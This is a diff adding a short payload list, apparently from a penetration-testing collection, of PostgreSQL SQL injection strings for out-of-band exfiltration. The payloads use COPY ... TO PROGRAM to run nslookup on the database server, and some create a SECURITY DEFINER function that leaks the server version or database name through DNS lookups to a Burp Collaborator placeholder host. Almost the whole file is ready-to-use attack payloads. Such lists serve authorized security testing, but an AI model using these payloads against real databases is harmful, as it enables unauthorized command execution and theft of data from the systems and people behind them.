@@ -1,0 +1,11 @@
+# PostgreSQL — Out-of-Band (OOB) / DNS exfiltration
+# Uses COPY ... TO PROGRAM with nslookup
+# Use Burp Collaborator or interactsh for listener
+
+# --- DNS lookup via COPY ---
+'; COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--
+'; COPY (SELECT 1) TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--
+
+# --- DNS exfiltration with data ---
+'; CREATE OR REPLACE FUNCTION f() RETURNS VOID AS $$ DECLARE c TEXT; DECLARE p TEXT; BEGIN SELECT INTO p (SELECT version()); c := 'COPY (SELECT '''') TO PROGRAM ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; EXECUTE c; END; $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT f()--
+'; CREATE OR REPLACE FUNCTION f() RETURNS VOID AS $$ DECLARE c TEXT; DECLARE p TEXT; BEGIN SELECT INTO p (SELECT current_database()); c := 'COPY (SELECT '''') TO PROGRAM ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; EXECUTE c; END; $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT f()--
